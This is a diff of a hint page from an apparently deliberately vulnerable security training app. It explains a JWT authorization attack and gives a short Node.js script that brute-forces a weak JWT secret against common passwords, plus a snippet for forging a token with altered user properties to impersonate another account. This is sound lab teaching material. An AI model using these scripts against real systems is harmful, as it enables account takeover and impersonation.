@@ -30,43 +30,40 @@
 <h5>Challenge Tips and Tricks</h5>
 <p>
     In the previous challenge you have broken into the test account. In this challenge you must perform an authorization attack by changing
-     from the test account to one of the hackers' accounts. You can achieve that by attacking the session identifier (which is a case of 
-     broken authentication). The JWT token is stored in the browser session storage.
-     <br> <br>
-     The application is using JWT for authentication. JWT contains a JSON object signed with a secret or RSA private key in the best cases.
-     Getting a hold of the JWT secret can proove devastating because attackers can impersonate anyone and can generate 'eternal' session identifiers
-     (which never expire).
-     The JWT secret in this case is very weak so you can easily crack it by writing a script that tries some of the most insecure passwords.
-     <br> <br>
-     In Node.JS you can use a script like this to verify a bunch of secrets:
-     <pre class="pre-scrollable">
-             const jwt = require('jsonwebtoken');
-             var token = "ENTER_THE_TOKEN";
-             var secrets = ["passw0rd","secret","1234"];
-             //if you're looking for secrets there's a good list here: https://www.theregister.co.uk/2010/01/21/lame_passwords_exposed_by_rockyou_hack/
-             secrets.forEach(function(secret){
+    from the test account to one of the hackers' accounts. You can achieve that by attacking the session identifier (which is a case of 
+    broken authentication). The JWT token is stored in the browser session storage.
+    <br> <br>
+    The application is using JWT for authentication. JWT contains a JSON object signed with a secret or RSA private key in the best cases.
+    Getting a hold of the JWT secret can proove devastating because attackers can impersonate anyone and can generate 'eternal' session identifiers
+    (which never expire).
+    The JWT secret in this case is very weak so you can easily crack it by writing a script that tries some of the most insecure passwords.
+    <br> <br>
+    In Node.JS you can use a script like this to verify a bunch of secrets:
+    <pre class="pre-scrollable">
+        const jwt = require('jsonwebtoken');
+        var token = "ENTER_THE_TOKEN";
+        var secrets = ["passw0rd","secret","1234"];
+        //if you're looking for secrets there's a good list here: https://www.theregister.co.uk/2010/01/21/lame_passwords_exposed_by_rockyou_hack/
+        for(var secret of secrets){
 
-                jwt.verify(token, secret, function(err, decoded) {
-                    if (err) {
-                        console.log('failed jwt verify: ', err);
-                    } else {
-                        console.log('authorized:', decoded);
-                    }
-                });
-
+            jwt.verify(token, secret, function(err, decoded) {
+                if (!err) {
+                    console.log('authorized:', decoded);
+                }
             });
-     </pre>
+
+        };
+    </pre>
+
+    Pay attention to the structure of the decoded test account. Change the properties of the javascript object to an account with more permissions. 
+
     <br>
     In Node.JS you can generate JWT tokens with a script like this:
     <pre class="pre-scrollable">
             const jwt = require('jsonwebtoken');
-            var token = jwt.sign({"sub": "username","name": "User Name"}, "SECRET");
+            var token = jwt.sign(userObject, "SECRET");
             console.log(token);
     </pre>
-    Once you impersonate one of the attackers, you will also notice that 
-    one of the messages points to the location of the code for the entire infrastructure, including lambdas,
-     malware and control application.
 
-    API Gateway will break the binary content however you can get the content via an S3 url once you figure out the file names ;)
 
 </p>
